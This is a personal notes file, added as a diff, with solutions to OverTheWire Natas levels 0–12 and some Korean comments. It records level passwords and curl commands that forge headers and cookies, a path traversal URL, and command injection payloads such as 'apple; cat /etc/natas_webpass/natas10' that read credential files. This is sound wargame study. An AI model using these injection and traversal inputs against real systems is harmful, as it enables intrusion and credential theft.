@@ -1,0 +1,147 @@
+0
+Username: natas0
+Password: natas0
+URL:      http://natas0.natas.labs.overthewire.org
+view-source:http://natas0.natas.labs.overthewire.org/
+
+
+1
+gtVrDuiDfck831PqWsLEZy5gyDz1clto
+view-source:http://natas1.natas.labs.overthewire.org/
+
+
+2
+ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+view-source:http://natas2.natas.labs.overthewire.org/
+view-source:http://natas2.natas.labs.overthewire.org/files/pixel.png
+http://natas2.natas.labs.overthewire.org/files/
+http://natas2.natas.labs.overthewire.org/files/users.txt
+
+
+3
+sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+view-source:http://natas3.natas.labs.overthewire.org/
+http://natas3.natas.labs.overthewire.org/robots.txt
+http://natas3.natas.labs.overthewire.org/s3cr3t/
+http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+
+
+4
+Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+https://blog.floriancourgey.com/2018/11/linux-training-overthewire-natas-1
+
+F12
+
+curl 'http://natas4.natas.labs.overthewire.org' -H "Authorization: Basic `echo -n "natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" | base64`" -H 'Referer: http://natas5.natas.labs.overthewire.org/'
+
+``안의 명령어가 실행되려면 큰따음표로 둘러싸여야한다.
+
+
+5
+iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+curl 'http://natas5.natas.labs.overthewire.org' -H "Authorization: Basic `echo -n "natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" | base64`"
+
+밑의 두개는 되는 경우 (Cookie)
+
+curl 'http://natas5.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Cookie: __cfduid=d367f554011c7c1ab2210015e9dc5ac931544566497; loggedin=1'
+
+curl 'http://natas5.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Cookie: loggedin=1'
+
+밑의 두개는 안돼는 경우 (Set-Cookie)
+
+curl 'http://natas5.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Set-Cookie: loggedin=1'
+
+curl 'http://natas5.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Set-Cookie: __cfduid=d367f554011c7c1ab2210015e9dc5ac931544566497; loggedin=1'
+
+
+6
+aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+curl 'http://natas6.natas.labs.overthewire.org' -H "Authorization: Basic `echo -n "natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1" | base64`"
+
+curl 'http://natas6.natas.labs.overthewire.org/includes/index-source.html' -H "Authorization: Basic `echo -n "natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1" | base64`" > natas
+
+for i in `cat ./natas`; do echo $i; done
+
+curl 'http://natas6.natas.labs.overthewire.org/includes/secret.inc' -H "Authorization: Basic `echo -n "natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1" | base64`"
+
+FOEIUWGHFEEUHOFUOIU
+
+
+7
+7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+Vim natas.sh
+
+curl "http://natas"$1".natas.labs.overthewire.org" -H "Authorization: Basic `echo -n "natas$1:$2" | base64`"
+
+Vim ~/.bash_aliases
+
+alias natas="/mnt/e/OverTheWire/natas/natas.sh"
+
+natas 7 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+// 앞으로는 위와 같이 그냥 “natas 레벨번호 비번” 만 입력하면 접속하도록 할것임.
+
+curl "http://natas7.natas.labs.overthewire.org/etc/natas_webpass/natas8" -H "Authorization: Basic `echo -n "natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9" | base64`"
+
+curl "http://natas7.natas.labs.overthewire.org/etc/natas_webpass/" -H "Authorization: Basic `echo -n "natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9" | base64`"
+
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+
+8
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 
+
+# reverse this bin2hex(strrev(base64_encode($secret)))
+
+php -r "echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));";echo ""
+
+# 저기 마지막 에코는 안해도 되는데 하면 다음 프롬프트가 밑에 떠서 깔끔함.
+
+oubWYf2kBq
+
+
+9
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+apple; ls -la /etc/natas_webpass/natas10
+
+apple; cat /etc/natas_webpass/natas10
+
+
+10
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+# '/[;|&]/'
+# we cannot use ; | &
+# grep can search several files
+# 비밀번호에 포함되어 있을듯한 문자로 여러번 시도해봤다.
+# 위와 같이 여러번 시도해봐도 되고, 아래와 같이 서치할 범위를 정해주면 한번에 찾는다.
+
+`echo "[0-9a-z] /etc/natas_webpass/natas11"`
+
+11
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+# deaultdata > 
+# loaddata() > 
+#	
+# savedata() > data
+
+// see natas11*.php files
+
+// first, get key value
+// get real cookie value.
+
+curl "http://natas11.natas.labs.overthewire.org/" -H "Authorization: Basic `echo -n "natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK" | base64`" -H 'Cookie: data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'
+
+12
+EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+
+
